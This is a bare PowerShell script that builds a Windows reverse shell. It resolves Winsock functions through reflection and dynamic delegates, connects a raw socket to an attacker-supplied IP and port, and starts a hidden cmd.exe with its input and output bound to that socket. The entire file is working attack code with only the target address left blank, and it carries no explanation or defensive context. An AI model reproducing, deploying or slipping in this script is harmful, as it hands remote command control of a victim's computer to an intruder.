

$IP   = # "Targe-IP-Address"
$PORT = # Target-Port-Number"

filter Get-Type ([string]$dllName,[string]$typeName){
    if( $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($dllName) ){
        $_.GetType($typeName)
    }
}

function Get-Function{
    Param(
        [string] $module,
        [string] $function
    )

    if( ($null -eq $GetModuleHandle) -or ($null -eq $GetProcAddress) )
    {
        throw "Error: GetModuleHandle and GetProcAddress must be initialized first!"
    }

    $moduleHandle = $GetModuleHandle.Invoke($null, @($module))
    $GetProcAddress.Invoke($null, @($moduleHandle, $function))
}

function Get-Delegate{
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr,
        [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes,
        [Parameter(Position = 2)] [Type] $retType = [Void]
    )

    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('QM', $false).
    DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')
    $delegate = $type.CreateType()

    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegate)
}


$assemblies             =  [AppDomain]::CurrentDomain.GetAssemblies()
$unsafeMethodsType      =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.UnsafeNativeMethods'
$nativeMethodsType      =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.NativeMethods'
$startupInformationType =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.NativeMethods+STARTUPINFO'
$processInformationType =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.SafeNativeMethods+PROCESS_INFORMATION'


$GetModuleHandle = $unsafeMethodsType.GetMethod('GetModuleHandle')
$GetProcAddress  = $unsafeMethodsType.GetMethod('GetProcAddress', [reflection.bindingflags]'Public,Static', $null, [System.Reflection.CallingConventions]::Any, @([System.IntPtr], [string]), $null);
$CreateProcess   = $nativeMethodsType.GetMethod("CreateProcess")


$ConnectAddr     = Get-Function "ws2_32.dll" "connect"
$WSASocketAddr   = Get-Function "ws2_32.dll" "WSASocketA"
$WSAStartupAddr  = Get-Function "ws2_32.dll" "WSAStartup"
$CloseSocketAddr = Get-Function "ws2_32.dll" "closesocket"


$CloseSocket = Get-Delegate $CloseSocketAddr @([IntPtr]) ([Int])
$WSAStartup  = Get-Delegate $WSAStartupAddr @([Int16], [Byte[]]) ([Int])
$Connect     = Get-Delegate $ConnectAddr @([IntPtr], [Byte[]], [Int]) ([Int])
$WSASocket   = Get-Delegate $WSASocketAddr @([System.Net.Sockets.AddressFamily], [System.Net.Sockets.SocketType], [System.Net.Sockets.ProtocolType], [IntPtr], [UInt32], [Int]) ([IntPtr])


$WSAStartup.Invoke(0x202, [System.Byte[]]::CreateInstance([System.Byte], 0x198))
$hSock = $WSASocket.Invoke([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::IP, [IntPtr]::Zero, 0, 0)


[Byte[]] $ip = [System.BitConverter]::GetBytes([System.Convert]::ToUInt32([ipaddress]::Parse($IP).Address))
[Byte[]] $port = [System.BitConverter]::GetBytes([System.Convert]::ToUInt16($PORT))
[Array]::Reverse($port)
[Byte[]] $buffer = 0x02, 0x00 + $port + $ip + 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00

$Connect.Invoke($hSock, $buffer, $buffer.Length)


$startupInformation = $startupInformationType.GetConstructors().Invoke($null)
$processInformation = $processInformationType.GetConstructors().Invoke($null)


$safeHandle = [Microsoft.Win32.SafeHandles.SafeFileHandle]::new($hSock, $true)
$startupInformation.dwFlags    = 0x00000100
$startupInformation.hStdInput  = $safeHandle
$startupInformation.hStdOutput = $safeHandle
$startupInformation.hStdError  = $safeHandle


$cmd = [System.Text.StringBuilder]::new("C:\\Windows\\System32\\cmd.exe")
$CreateProcess.Invoke($null, @($null, $cmd, $null, $null, $true, 0x08000000, [IntPtr]::Zero, $null, $startupInformation, $processInformation))


$CloseSocket.Invoke($hSock)
